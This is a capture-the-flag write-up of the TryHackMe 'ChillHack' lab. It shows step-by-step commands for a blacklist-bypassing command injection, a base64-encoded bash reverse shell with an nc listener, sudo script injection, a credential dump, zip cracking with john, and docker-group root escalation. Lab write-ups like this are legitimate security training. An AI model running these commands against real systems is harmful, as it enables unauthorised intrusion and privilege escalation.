# ChillHack — TryHackMe Writeup

## Enumeration

Starting with a nmap scan to discover open ports and services:

```
nmap -p- -A chill.thm
```

<img width="716" height="817" alt="image" src="https://github.com/user-attachments/assets/0604c56c-b89f-4354-a324-7bf8eea3f4bc" />

We find three open ports: **21 (FTP)**, **22 (SSH)**, and **80 (HTTP)**.

Then a gobuster scan to discover hidden directories:

```
gobuster dir -u http://chill.thm -w /usr/share/wordlists/dirb/big.txt -x php
```

<img width="716" height="542" alt="image" src="https://github.com/user-attachments/assets/86f0e018-cbbd-4cdf-97e4-e66e8ec5bd09" />

We find a `/secret` directory containing a command execution form.

## Command Injection (Filtered Shell)

The form at `/secret/index.php` allows command execution but has a **blacklist filter** blocking: `nc`, `python`, `bash`, `php`, `perl`, `rm`, `cat`, `head`, `tail`, `python3`, `more`, `less`, `sh`, `ls`.

To bypass the filter, we use alternative commands:

| Blocked | Alternative |
|---------|-------------|
| `cat` | `tac` |
| `ls` | `echo *` |
| `stat` | for reading permissions |

## Reverse Shell

To get a reverse shell, we need to bypass the filter using **base64 encoding**.

On our machine, encode the reverse shell payload:

```
echo -n "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" | base64
```

Then inject the following in the command input:

```
echo <base64_payload> | base64 -d | b\ash
```

Don't forget to start a listener on your machine first:

```
nc -lvnp <PORT>
```

We get a shell as **www-data**.

## Lateral Movement: www-data → apaar

We check what we can run with elevated privileges:

```
sudo -l
```

<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/71dee07b-eca5-417d-93ff-22572b86123e" />

We can run `/home/apaar/.helpline.sh` as **apaar** without a password. The script takes two inputs and executes `echo $msg`, which allows us to inject a command.

```
sudo -u apaar /home/apaar/.helpline.sh
```

- First input (person): anything
- Second input (message): `/bin/bash`

We are now **apaar** and can read the first flag:

```
cat /home/apaar/local.txt
```

<img width="956" height="229" alt="image" src="https://github.com/user-attachments/assets/7c019368-0bee-4756-b4fa-800c5c71d49d" />

## Lateral Movement: apaar → anurodh

### Finding credentials

We explore the web server and discover a second web application running internally on **port 9001**:

```
ss -tlnp
```

The source code at `/var/www/files/index.php` reveals **MySQL credentials**:

```
root:!@m+her00+@db
```

We dump the database:

```
mysql -u root -p'!@m+her00+@db' -e "SELECT * FROM webportal.users;"
```

| username | password (MD5) |
|----------|----------------|
| Aurick | `7e53614ced3640d5de23f111806cc4fd` |
| cullapaar | `686216240e5af30df0501e53c789a649` |

### Steganography

The file `hacker.php` contains the hint **"Look in the dark"**, pointing to steganography in the image `hacker-with-laptop_23-2147985341.jpg`.

We extract the image from the target by encoding it in base64:

```
base64 /var/www/files/images/hacker-with-laptop_23-2147985341.jpg
```

On our machine, we decode and extract the hidden data:

```
base64 -d hacker.b64 > hacker.jpg
steghide extract -sf hacker.jpg
```

Passphrase: *(empty, just press Enter)*

This extracts `backup.zip`. The zip is password-protected, so we crack it:

```
zip2john backup.zip > zip_hash.txt
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Inside the zip we find **anurodh's password**. We switch user:

```
su anurodh
```

## Privilege Escalation: anurodh → root

We check anurodh's groups:

```
id
```

Anurodh is a member of the **docker** group, which allows a classic privilege escalation by mounting the host filesystem inside a container:

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

We are now **root** and can read the final flag:

```
cat /root/proof.txt
```
